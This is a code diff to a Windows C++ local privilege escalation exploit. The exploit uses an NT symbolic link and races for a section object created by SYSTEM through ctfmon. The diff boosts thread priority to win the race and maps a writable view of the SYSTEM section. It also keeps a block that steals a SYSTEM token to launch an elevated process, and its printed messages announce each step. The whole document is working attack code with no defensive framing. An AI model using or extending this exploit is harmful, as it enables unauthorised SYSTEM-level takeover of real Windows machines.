@@ -300,6 +300,7 @@ int wmain(int argc, wchar_t** argv)
 
     HANDLE hlnk = NULL;
     HANDLE hmapping = NULL;
+    LPVOID pSectionView = NULL;
 
     NTSTATUS stat = _NtCreateSymbolicLinkObject(&hlnk, GENERIC_ALL, &objattr, &linktarget);
     if (stat)
@@ -314,16 +315,21 @@ int wmain(int argc, wchar_t** argv)
     shi.lpFile = L"C:\\Windows\\System32\\conhost.exe";
     ShellExecuteEx(&shi);
 
+    // Boost priority to improve race-window odds, yield instead of spinning.
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_TIME_CRITICAL);
     do {
         _NtOpenSection(&hmapping, MAXIMUM_ALLOWED, &objattr);
+        if (!hmapping) YieldProcessor();
     } while (!hmapping);
+    SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_NORMAL);
 
-    // ---- BEGIN: Added — steal SYSTEM token while ctfmon is still alive ----
-    //
-    // At this point ctfmon.exe is running as SYSTEM (it just created the section).
-    // Walk the process list, grab a SYSTEM token, and spawn an elevated cmd.exe.
-    // Requires SeDebugPrivilege (available to local admins) and
-    // SeImpersonatePrivilege (available to local admins / service accounts).
+    // Map a writable view — proves write access to the SYSTEM-created section.
+    pSectionView = MapViewOfFile(hmapping, FILE_MAP_ALL_ACCESS, 0, 0, 0);
+    if (pSectionView)
+        printf("[*] SYSTEM section mapped at %p — writable view confirmed\n", pSectionView);
+
+    // Steal SYSTEM token while ctfmon is still alive (it just created the section).
+    // Requires SeDebugPrivilege + SeImpersonatePrivilege (local admins by default).
     {
         printf("[*] Section created — attempting SYSTEM token theft...\n");
         HANDLE hSysToken = StealSystemToken();
@@ -334,7 +340,6 @@ int wmain(int argc, wchar_t** argv)
             printf("[-] Could not obtain a SYSTEM token.\n");
         }
     }
-    // ---- END: Added ----
 
     lockblock = SetPolicyVal();
 
@@ -355,6 +360,8 @@ int wmain(int argc, wchar_t** argv)
 cleanup:
     if (hlnk)
         CloseHandle(hlnk);
+    if (pSectionView)
+        UnmapViewOfFile(pSectionView);
     if (hmapping)
     {
         _getch();
